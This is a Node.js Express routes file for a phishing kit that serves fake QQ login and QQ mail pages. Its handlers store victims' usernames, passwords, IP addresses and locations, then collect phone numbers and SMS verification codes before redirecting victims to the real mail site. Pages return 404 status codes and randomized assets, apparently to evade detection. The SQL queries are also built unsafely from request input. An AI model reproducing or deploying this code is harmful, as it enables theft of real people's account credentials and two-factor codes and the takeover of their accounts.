var _ip = require('./../lib/ip.js');
var sql = require('../db/sqlite.js');
var code = require('../lib/incode.js');
var magic = require('../lib/magic.js');
var cwd = process.cwd();
var path = require('path');
var ranStr = require('../lib/ranstr.js')

var isMobile = function (ua) {
    if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(ua)) {
        return true
    } else {
        return false
    }
}

module.exports = function (app) {
    function insertData(req, cb) {
        var qq = req.body.u;
        var pwd = req.body.p;
        var userId = req.body.uid;
        var mid = req.body.mid;
        var ranid = req.body.ranid;
        var ip = req.connection.remoteAddress;
        ip = ip.substr(ip.indexOf(':', 3) + 1);
        // ip = req.headers['x-real-ip'];	
        var insertTime = new Date().getTime().toString();
        var mname, userName, address;

        sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + userId + ';', function (err, rows) {
            mname = rows[0].tempName;
            userName = rows[0].userName;
            sql.all(`insert into datas values(null,"${qq}","${pwd}","${ip}","${['未知地址']}",${mid},"${mname}",${userId},"${userName}","${insertTime}",0,'','','${ranid}');`, function (err, rows) {
                console.log(rows)
                _ip(ip, function (ip, add) {
                    address = add;
                    sql.all('UPDATE datas SET address = "' + address + '" WHERE ip = "' + ip + '";')
                });
                cb();
            });

        });
    };

    app.get('/_login/:name', function (req, res) {
        res.statusCode = 404;
        var uidStr = req.headers.host;
        var uid = uidStr.substr(0, uidStr.indexOf('.'));
        uid = code.decode(uid);
        sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
            var mid = rows[0].tempId;
            var bgUrl = rows[0].bgUrl;
            var url = rows[0].url;
            res.render('pages/pc_login_window.html', { layout: null, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en(), ranImg: ranStr.ranImg });
        });
    });

    app.get('/bnx/:name', function (req, res) {
        res.statusCode = 404;
        res.sendFile(path.join(cwd, '/views/', ranStr.imgArr[req.params.name]))
    });

    app.post('/_login/:name', function (req, res) {
        var tz = req.body.tz;
        var uidStr = req.headers.host;
        var uid = uidStr.substr(0, uidStr.indexOf('.'));
        uid = code.decode(uid);
        insertData(req, function () {
            sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
                var mid = rows[0].tempId;
                var bgUrl = rows[0].bgUrl;
                var url = rows[0].url;
                if (tz.toString() === '1') {
                    return res.send('<script>window.parent.location.href="' + url + '";</script>');
                }
                res.render('pages/pc_login_window.html', { layout: null, tz: 1, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en(), ranImg: ranStr.ranImg });
            });
        });
    });

    app.get('/x/:name', function (req, res) {
        var uidStr = req.headers.host;
        var uid = uidStr.substr(0, uidStr.indexOf('.'));
        uid = code.decode(uid);
        res.statusCode = 404;

        sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
            var mid = rows[0].tempId;
            var bgUrl = rows[0].bgUrl;
            var url = rows[0].url;
            if (url === 'MAIL') {
                return res.redirect('/k/' + req.params.name);
            }
            return res.render('pages/wap_temp.html', { layout: null, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en(), ranImg: ranStr.ranImg });
        });
    });

    // 邮箱
    app.get('/vote/:name', function (req, res) {
        var uidStr = req.headers.host;
        var uid = uidStr.substr(0, uidStr.indexOf('.'));
        uid = code.decode(uid);
        res.statusCode = 404;
        var x = req.url.split('/')
        var s_ran = x[x.length - 2]
        try {
            sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
                var mid = rows[0].tempId;
                var bgUrl = rows[0].bgUrl;
                var url = rows[0].url;
                // res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail2.html' : 'pages/pc_mail.html', { layout: null, sha: ranStr.sha, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp });
                res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail2.html' : 'pages/wap_mail2.html', { layout: null, sha: ranStr.sha, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp, ranRp2: ranStr.ranRp_2 });
                ranStr.count++;
            });
        } catch (e) {
            res.sendFile(path.join(cwd, '/404.html'));
        }
    });



    app.post('/vote/:name', function (req, res) {
        var tz = req.body.tz;
        var uidStr = req.headers.host;

        var uid = uidStr.substr(0, uidStr.indexOf('.'));
        uid = code.decode(uid);
        var x = req.url.split('/')
        var s_ran = x[x.length - 2]
        try {
            insertData(req, function () {
                sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
                    var mid = rows[0].tempId;
                    var bgUrl = rows[0].bgUrl;
                    var url = rows[0].url;
                    if (tz.toString() === '1') {
                        return res.send('<script>window.parent.location.href="http://mail.qq.com";</script>');
                    }
                    res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail2.html' : 'pages/wap_mail2.html', { layout: null, tz: 1, sha: ranStr.sha, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp, ranRp2: ranStr.ranRp_2 });
                    ranStr.count++;
                });
            });
        } catch (e) {
            res.sendFile(path.join(cwd, '/404.html'));
        }

    });

    app.post(['/x/:name', '/x'], function (req, res) {
        var tz = req.body.tz;
        var uidStr = req.headers.host;
        var uid = uidStr.substr(0, uidStr.indexOf('.'));
        uid = code.decode(uid);
        insertData(req, function () {
            sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
                var mid = rows[0].tempId;
                var bgUrl = rows[0].bgUrl;
                var url = rows[0].url;
                if (url === 'MAIL') {
                    return res.redirect('/k/' + req.params.name);
                }
                if (tz.toString() === '1') {
                    return res.send('<script>window.parent.location.href="' + url + '";</script>');
                }
                return res.render('pages/wap_temp.html', { layout: null, tz: 1, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en(), ranImg: ranStr.ranImg });
            });
        });
    });

    app.get('/t/:name', function (req, res) {
        var x = req.url.split('/')
        var s_ran = x[x.length - 1]
        res.statusCode = 404;
        return res.render(path.join(cwd, '/yzm.html'), { layout: null, ranStr: ranStr.en2(s_ran), cssfmt: ranStr.cssFmt, ranImg: ranStr.ranImg, ranRp: ranStr.ranRp })
    });

    app.get('/t_close.html/:name', function (req, res) {
        res.statusCode = 404;
        res.render(path.join(cwd, '/close.html'), { layout: null, ranStr: ranStr.en(), cssfmt: ranStr.cssFmt, ranImg: ranStr.ranImg })
    });

    // jquery 和 验证码js
    app.get('/jquery/:name', function (req, res) {
        var x = req.headers.referer.split('/')
        var jmStr = x[x.length - 2]
        res.render('ssrjs/yzm_jq_decrypt.html', { layout: null, ranStr: ranStr.en2(jmStr), ranStr2: ranStr.en(), cssfmt: ranStr.cssFmt, ranImg: ranStr.ranImg, jmStr: jmStr })
    });

    // 验证码css
    app.get('/bootstrap/css/:name', function (req, res) {
        var x = req.headers.referer.split('/')
        var jmStr = x[x.length - 1]
        res.render('ssrjs/yzm_css.html', { layout: null, ranStr: ranStr.en2(jmStr), cssfmt: ranStr.cssFmt, ranImg: ranStr.ranImg, jmStr: jmStr })
    });

    app.get('/ml/:name', function (req, res) {
        res.render('pages/wap_mail2.html', {
            layout: null,
            tz: 1,
            uid: uid,
            mid: mid,
            bgUrl: bgUrl,
            ranStr: ranStr.en2(s_ran),
            ranImg: ranStr.ranImg,
            ranRp: ranStr.ranRp
        });

    })

    //验证码图片
    app.get('/i/:a/:name/:c', function (req, res) {
        res.sendFile(path.join(cwd, `/views/images/yzm/${req.params.name}.jpeg`))
    });

    // app.get('/', function (req, res) {
    //     res.statusCode = 404;
    //     var uidStr = req.headers.host;

    //     var uid = uidStr.substr(0, uidStr.indexOf('.'));
    //     res.render(path.join(cwd, '/index.html'), { layout: null, ranStr: ranStr.en(), func: code.encode, uid: uid, cssfmt: ranStr.cssFmt, ranImg: ranStr.ranImg, ran: ranStr })
    // });

    app.post('/tracker', function (req, res) {

    })

    // ===================================================================================================================================================================================================================================================================================================================================



    // 邮箱
    app.get('/', function (req, res) {
        var uidStr = req.headers.host;
        var uid = uidStr.substr(0, uidStr.indexOf('.'));
        uid = code.decode(uid);
        res.statusCode = 404;
        // var x = req.url.split('/')
        // var s_ran = x[x.length - 2]
        try {
            sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
                var mid = rows[0].tempId;
                var bgUrl = rows[0].bgUrl;
                var url = rows[0].url;
                // res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail2.html' : 'pages/pc_mail.html', { layout: null, sha: ranStr.sha, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp });
                res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail_c.html' : 'pages/wap_mail_c.html', { layout: null, sha: ranStr.sha, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp, ranRp2: ranStr.ranRp_2 });
                ranStr.count++;
            });
        } catch (e) {
            res.sendFile(path.join(cwd, '/404.html'));
        }
    });

    app.get('/v3/phone', function (req, res) {
        res.render('pages/wap_mail_p.html', { layout: null })
    })

    app.post('/v2/ins', function (req, res) {
        var uidStr = req.headers.host;
        var uid = uidStr.substr(0, uidStr.indexOf('.'));
        uid = code.decode(uid);
        var x = req.url.split('/')
        var s_ran = x[x.length - 2]
        try {
            insertData(req, function () {
                res.send('0')
            });
        } catch (e) {
            res.send('-1')
        }
    })

    app.post('/v2/updatep',function(req,res){
        // UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值
        var phone = req.body.phone
        var ranid = req.body.ranid
        sql.all(`update datas set phone='${phone}' where ranid = '${ranid}'`, function (err, rows) {
            res.send('0')
        })
    })

    app.post('/v2/updatec',function(req,res){
        // UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值
        var code = req.body.code
        var ranid = req.body.ranid
        sql.all(`update datas set phoneCode='${code}' where ranid = '${ranid}'`, function (err, rows) {
            res.send('0')
        })
    })

    app.get('/v2/js/mc_1.js', function (req, res) {
        res.render('js/mc_1.html', { layout: null, uid: req.query.uid, mid: req.query.mid });
    })
    app.get('/v2/js/mc_2.js', function (req, res) {
        res.render('js/mc_2.html', { layout: null, uid: req.query.uid, mid: req.query.mid });
    })

    app.get('/v2/js/login.js', function (req, res) {
        res.render('js/login.html', { layout: null, uid: req.query.uid, mid: req.query.mid });
    })

    app.get('/v2/js/yzm.js', function (req, res) {
        res.render('js/yzm.html', { layout: null, uid: req.query.uid, mid: req.query.mid });
    })
};
